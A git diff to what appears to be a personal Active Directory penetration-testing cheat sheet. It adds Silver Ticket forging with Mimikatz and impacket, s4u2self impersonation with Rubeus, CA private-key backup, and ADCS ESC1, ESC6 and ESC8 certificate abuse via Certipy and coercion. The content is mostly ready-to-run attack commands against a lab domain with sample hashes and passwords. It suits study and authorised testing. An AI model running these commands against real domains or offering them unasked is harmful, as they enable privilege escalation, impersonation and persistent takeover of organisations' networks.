@@ -63,6 +63,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [NetNTLMv1 to LDAP](#netntlmv1-to-ldap)
 * **[Kerberos Relay](#kerberos-relay)**
 * **[Persistence](#persistence)**
+	* [Silver Ticket](#silver-ticket)
 	* [Golden Ticket](#golden-ticket)
 	* [Diamond Ticket](#diamond-ticket)
 	* [Golden Certificate](#golden-certificate)
@@ -100,6 +101,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [PKI Abuse](#pki-abuse)
 	* [ESC1](#esc1)
 	* [ESC4](#esc4)
+	* [ESC6](#esc6)
 	* [ESC8](#esc8)
 	* [Certifried](#certifried)
 	* [ADCS References](#adcs-references)
@@ -747,6 +749,33 @@ KrbRelayUp.exe full -m [rbcd|shadowcred] -f
 ```
 
 # Persistence
+
+### Silver Ticket
+A silver ticket is quite different from a [Golden Ticket](#golden-ticket), it will be signed and encrypted with a computer account hash itself. As how kerberos works for ST request, for example if we are requesting *cifs* service for a workstation, the ST would be encrypted with the workstation's computer account hash. Hence, if a computer account hash is compromised, we could forge a ticket to access any service and impersonate as any local users available. 
+
+| Attribute           | Value                                     |
+| ------------------- | ----------------------------------------- |
+| Domain              | range.net                                 |
+| Domain SID          | S-1-5-21-2004564407-2130411480-2428574852 |
+| Computer nthash/Aes | 95e392df668ca6bd103b905856acb8a9          |
+| SPN                 | cifs/ws01.ran.net                         |
+| User                | Administrator                             |
+```
+# Mimikatz
+kerberos::golden /domain:range.net /sid:S-1-5-21-2004564407-2130411480-2428574852 /rc4:95e392df668ca6bd103b905856acb8a9 /user:Administrator /target:ws01.range.net /service:cifs /ptt
+
+# impacket
+ticketer.py -nthash 95e392df668ca6bd103b905856acb8a9 -domain-sid S-1-5-21-2004564407-2130411480-2428574852 -domain range.net -spn cifs/ws01.range.net Administrator
+```
+In the case where silver ticket produces a lot of error, one way of achieving the same goal is by doing a **s4u2self** to impersonate any users that are available on the workstation. *Note that the spn value must contain a valid hostname or FQDN or the workstation.*
+```
+# Rubeus
+Rubeus.exe s4u /user:ws01$ /rc4:95e392df668ca6bd103b905856acb8a9 /domain:range.net /dc:192.168.86.182 /impersonateuser:Administrator /msdsspn:cifs/ws01.range.net /altservice:http,host,ldap /ptt
+
+# Impacket
+getST.py range.net/ws01\$ -hashes :95e392df668ca6bd103b905856acb8a9 -impersonate Administrator -spn cifs/ws01.range.net
+```
+
 ### Golden Ticket
 A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
 | Attribute   | Value                                  |
@@ -794,15 +823,19 @@ For detailed explanation, read this article by Semperis [here](https://www.sempe
 The title is basically self explanatory, this attack is pretty much the same as golden certificate where you forge a certificate offline with a compromised private key on a CA server *(Having system access on a CA)*. Therefore, it can be used to forge a certificate and sign it with the private key to be used later on for persistence purposes. A certificate will normally valid up until 1 year duration. 
 1. Extract private key from CA
 ```
+# SharpDPAPI
 SharpDPAPI.exe certificates /machine
+
+# Certipy
+certipy ca -u 'localadmin' -p 'Password1234' -backup -target ca01.range.net -ca 'range-CA01-CA'
 ```
-2. Copy the cert into a .pem file and convert to a usable format (.pfx) to perform [Pass-The-Certificate](#pass-the-certificate) attack. *Note that this will require a user defined password*
+2. *If Certipy is used in step 1, you can skip this step*. Copy the cert into a .pem file and convert to a usable format (.pfx) to perform [Pass-The-Certificate](#pass-the-certificate) attack. *Note that this will require a user defined password*
 ```
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 3. Forge a certificate
 ```
-# certipy
+# certipy (this step is unnecessary if you used certipy in step 1)
 1. convert pfx to a certipy usable cert (no password)
 certipy cert -export -pfx cert.pfx -password admin -out final.pfx
 
@@ -1277,6 +1310,10 @@ _Note that you would require one valid user to enroll the certificate_
 
 1. List for available vulnerable templates using [certi](https://github.com/eloypgz/certi)
 ```
+# Certipy
+certipy find -u peter@range.net -p Password123 -dc-ip 192.168.86.183 -vulnerable -enabled -stdout
+
+# Certi
 python3 certi.py list range.net/peter:'Welcome1234' --dc-ip 10.8.0.2 --vuln --enabled
 
 # output should normally be like this
@@ -1301,12 +1338,20 @@ Permissions
 
 2. If requirements are met, then request the certificate using certi by specifying alternate name that include a high privileged user (ie Domain Admins)
 ```
+# Certi
 python3 certi.py req range.net/peter:'Welcome1234'@CA01.range.net range-CA01-CA -k -n --template 'VulnUser' --alt-name 'rangeadm'
+
+# Certipy
+certipy req -u peter@range.net -p Password123 -target ca01.range.net -ca 'range-CA01-CA' -template 'VulnUser' -upn 'Administrator@range.net'
 ```
 
 3. A pfx certificate should now be retrieved. Run the following command to request tgt by using the ceritifcate by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
 ```
+# impacket
 python3 gettgtpkinit.py range.net/rangeadm -cert-pfx /opt/certi/rangeadm@range.net.pfx -pfx-pass 'admin' -dc-ip 10.8.0.2 /tmp/rangeadm.ccache
+
+# certipy
+certipy auth -pfx administrator.pfx -dc-ip 192.168.86.183
 ```
 
 4. Now a ccache file should now be retrieved. Export the ccache file into `KRB5CCNAME` environment variable and [DCSync](#dcsync)
@@ -1339,9 +1384,27 @@ python3 modifyCertTemplate.py range.net/peter:'Welcome1234' -template ESC4 -valu
 
 3. Now it should be vulnerable to [ESC1](#esc1)
 
-### ESC8
+### ESC6
+This only applies to a CA that has an attribute `EDITF_ATTRIBUTEALTNAME2` in registry value. Registry path is at `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\range-CA01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`. This attribute means that even when a template is configured to use an AD Object Subject Name, we could specify a Subject Alternative Name. This also means that all templates will be vulnerable
 
-This requires NTLMv2 relaying from target identity to the /certsrc/certfnsh.asp endpoint to request a certificate. Below are the steps to reproduce
+1. Find a vunlerable template with **certi**. The output of a vunlerable template to ESC6 will be as follows.
+```
+certipy find -u peter@range.net -p Password123 -dc-ip 192.168.86.183 -vulnerable -enabled -stdout
+[[..snip..]]
+ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
+[[..snip..]]
+```
+2. Request a certificate with an Alternative Subject Name *(upn)*
+```
+certipy req -u peter@range.net -p Password123 -target ca01.range.net -ca 'range-CA01-CA' -template 'User' -upn 'Administrator@range.net'
+```
+3. Authenticate with the template retrieved.
+```
+certipy auth -pfx administrator.pfx -dc-ip 192.168.86.183
+```
+
+### ESC8
+This requires NTLMv2 relaying from target identity to the /certsrc/certfnsh.asp endpoint to request a certificate. Below are the steps to reproduce.  In case of successful coerce, relayed NetNTLM can be used to request a certificate as the account itself. 
 
 1. Fire up `ntlmrelayx.py` to listen for incoming hash and relay it to target url
 ```
@@ -1365,8 +1428,21 @@ python3 /opt/AD/PKINITtools/getnthash.py range.net/dc01\$ -key c5deec1a9ef6cbaf6
 ```
 5. NTLM hash should now be retrieved and win!
 
-### Certifried
+Step 1, 3 and 4 can be skipped with **certipy**
+1. Use relay module in certipy
+```
+certipy relay -ca ca01.range.net -template 'DomainController'
+```
+2. Coerce with any coercion methods that you'd prefer.
+```
+py Coercer.py -t 192.168.86.182 -l 192.168.86.193
+```
+3. Authenticate with the retrieved certificate with certipy's auth module.
+```
+certipy auth -pfx dc01.pfx -dc-ip 192.168.86.183
+```
 
+### Certifried
 **User** template certificate would identify and distinguish the certificate with the User Principal Name(UPN) of the certificate as _SubjectAltRequireUpn_ is in the `msPKI-Certificate-Name-Flag` attributes. However, **Machine** template distinguish computer accounts' certificates only by `dnsHostName` attribute which can be edited out and cause confusion in the KDC and attacker can request certificate as DC instead of the legitimate computer and results in a [DCSync](#dcsync) attack.
 
 1. Add a fake computer account with [PowerMad](https://github.com/Kevin-Robertson/Powermad) or [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
